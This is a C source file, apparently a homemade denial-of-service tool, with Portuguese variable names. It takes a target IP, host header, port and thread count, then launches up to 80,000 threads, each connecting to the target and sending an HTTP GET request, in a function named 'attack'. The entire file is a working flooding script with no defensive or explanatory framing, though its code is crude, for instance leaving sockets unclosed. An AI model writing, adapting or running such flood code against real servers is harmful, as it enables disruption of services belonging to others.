#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <pthread.h>
#include <time.h>

#define MAXTH 80000

pthread_t threads[MAXTH];

typedef struct alvo PARAMS;
typedef struct sockaddr SADDR;

struct alvo
{
	char *ip;
	char *host;
	int porta;
};

void *attack(void *arg)
{
	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);

	PARAMS *av1 = (struct alvo *) arg;

	char *host = (char *) av1->host;
	char *ip = (char *) av1->ip;
	int porta = (int) av1->porta;

	char req[200];
	sprintf(req, "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", host);
	struct sockaddr_in alvo;

	alvo.sin_addr.s_addr = inet_addr(ip);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);

	int sTest;

	if ((sTest = socket(AF_INET, SOCK_STREAM, 0)) >= 0)
	{
		if (connect(sTest, (SADDR *)&alvo, sizeof(alvo)) >= 0)
		{
			int meusocket = socket(AF_INET, SOCK_STREAM, 0);
			int conecta = connect(meusocket, (SADDR *)&alvo, sizeof(alvo));
			send(meusocket, req, strlen(req), 0);
		}
		else
		{
			printf("Connect Error\n");
		}
	}
	else
	{
		printf("Socket Error\n");
	}
}

int main(int argc, char *argv[])
{
	int i, j;

	PARAMS av;

	av.ip = argv[1];
	av.host = argv[2];
	av.porta = atoi(argv[3]);
	int tN = atoi(argv[4]);

	for (i = 0; i < tN; i++)
	{
		pthread_create(&(threads[i]), NULL, attack, &av);
		printf("Threads %d\n", i);
		system("cls");
	}
	
	for (i = 0; i < tN; i++)
	{
		pthread_join(threads[i],NULL);
	}

	return 0;
}
